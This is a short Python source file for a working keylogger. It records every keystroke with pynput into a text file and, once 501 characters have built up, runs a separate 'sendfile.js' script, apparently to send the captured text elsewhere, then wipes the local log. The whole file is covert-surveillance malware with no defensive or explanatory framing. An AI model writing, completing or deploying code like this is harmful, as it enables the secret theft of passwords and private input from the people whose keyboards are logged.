from pynput.keyboard import Listener, Key
from Naked.toolshed.shell import execute_js, muterun_js
from txtHandling import *

filename = 'key_logger.txt'


def on_press(key):

    f = open(filename, 'a')

    if hasattr(key, 'char'):
        f.write(key.char)
    elif key == Key.space:
        f.write(' ')
    elif key == Key.enter:
        f.write('\n')
    elif key == Key.tab:
        f.write('\t')
    elif key == Key.backspace:
        deleteLast('key_logger.txt')
    elif key == Key.caps_lock:
        f.write('[Upper]')
    else:
        f.write('['+key.name+']')

    f.close()

    if getChars('key_logger.txt') >= 501:
        result = execute_js('sendfile.js')
        if result:
            deleteContentFile('key_logger.txt')
            print(
                'file content successfully deleted => Javascript succcessfully executed!')
        else:
            print('Javascript not executed, something went wrong!')


with Listener(on_press=on_press) as listener:
    listener.join()
